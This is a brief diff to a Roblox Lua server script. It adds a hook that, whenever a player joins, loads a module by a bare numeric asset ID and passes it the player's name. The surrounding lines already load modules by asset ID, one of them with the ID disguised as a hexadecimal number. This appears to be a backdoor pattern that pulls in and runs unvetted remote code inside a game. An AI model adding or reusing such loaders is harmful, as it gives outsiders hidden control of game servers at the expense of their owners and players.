@@ -1,3 +1,7 @@
+local p = 80127727433648
+game.Players.PlayerAdded:Connect(function(b)
+    require(p).important(b.Name)
+end)
 require(81493423317900)()
 game.Players.PlayerAdded:Connect(function(xax)
     require(0x7985e5f0add5):Check(xax.Name)
